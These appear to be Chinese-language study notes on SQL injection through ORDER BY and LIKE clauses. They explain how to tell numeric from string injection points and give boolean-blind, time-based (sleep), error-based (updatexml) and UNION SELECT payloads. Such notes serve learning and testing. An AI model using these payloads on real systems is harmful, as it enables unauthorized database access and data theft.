## **orderby**
orderby可能出现三种场景：
```
order by 1，通过第几个字段来排序。变量是数值，可预编译，变量可以是字符。
order by "name"，通过某个字段名排序。变量是字符串，不可预编译。

group by sex order by count(*)，分组后通过分组后的数排序，相当于新增了一个字段，通过这个字段排序。一般不可控，排除注入。
```

orderby注入：可控参数判断过滤后类型是数值还是字符。
```
传入rand()在数字型中，每次刷新会显示不同的排序结果
当在字符型中用?sort=rand(),则不会有效果,排序不会改变

因此用rand()可判断注入点过滤后类型。
```
<https://www.cnblogs.com/1ink/p/15107674.html>
orderby利用：因为排序差异可使用布尔盲注，或者时间盲注，不可以联合注入，因为orderby必须在一个sql语句最后。
```
//?order=if(表达式,id,loginName)
//表达式为true时,根据id排序
//表达式为false时,根据loginName排序

order by sleep(5)
```
报错回显
```
order by updatexml(1, if (1=2,1,concat(0 x 7 e,database(), 0 x 7 e)), 1);
```

^
## **like**
like可以使用联合注入。
like一般也在where语句之后。
```
1、where like xx
where like 'admin' union select 1,2,3,database()
'admin'+union+select+sleep(15)

2、where like "xx"
where like " admin" union select 1,2,3,database()-- "

admin'+union+select+sleep(15)--+
```